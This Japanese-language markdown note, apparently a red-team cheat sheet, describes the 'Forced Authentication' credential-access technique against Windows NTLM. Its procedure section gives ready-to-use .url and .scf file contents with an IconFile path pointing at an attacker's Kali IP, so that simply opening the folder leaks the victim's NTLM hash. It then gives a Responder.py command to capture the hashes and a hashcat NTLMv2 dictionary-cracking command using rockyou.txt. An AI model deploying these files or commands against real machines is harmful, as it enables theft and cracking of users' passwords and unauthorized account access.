# Credential Access

## Forced Authentication

### 概要

- NTLM認証で利用されるNTLMハッシュの取得
- リンクを踏ませる(HTMl埋め込み)
- リンクファイルを標的端末に配置、エクスプローラー等が配置したファイルを参照することで認証情報を送信(ファイルを実行する必要なし)

#### 攻撃手法

- SMBプロトコルでリモートリソースへアクセスする際、まずNTLM認証を試みる。
- 認証を行う際にNTLMハッシュ情報が自動的にアクセス先に送信される。
- C2へアクセスするようなリンクファイル等を配置してアクセスさせる。
- C2に送信されるNTLMハッシュを受け取れるプログラムが動いていれば標的のNTLMハッシュ値を取得できる。

#### 手順(LINKファイル)

- 下記の内容を記述した .urlファイルを標的の端末に配置

``` js
    [InternetShortcut]
    URL=whatever
    WorkingDirectory=whatever
    IconFile=¥¥[kaliのIPアドレス]¥%USERNAME%.icon
    IconIndex=1
```

- sfcファイルも使える

``` shell
    [shell]
    Command=2
    IconFile=\\[kaliのIPアドレス]\[共有ファルダ]\nc.ico
    [Taskbar]
    Command=ToggleDesktop
```

> 他にもRTF、XMLとかも使えるらしい

- kaliでResponder.pyを起動

``` shell
    Python2 Responder.py -I eth1
```

リンクファイルのあるフォルダを開くと IP、Username、NTLMハッシュがkaliに送信される。

- 受信したNTLMハッシュをテキストファイルにコピー
- kaliでhashcatを使用してハッシュの解析

```shell
    hashcat -m 5600 -a 0 [hashファイル] /usr/share/wordlists/rockyou.txt --force --potfile-disable
    # -mはハッシュタイプ 5600はNTLMv2
    # -aはアタックモード 0は辞書攻撃 3でブルートフォース
    # --potfile-disable 解析結果をpotファイルに書き込むのを無視
```

[hashcat wiki](https://hashcat.net/wiki/doku.php?id=hashcat)
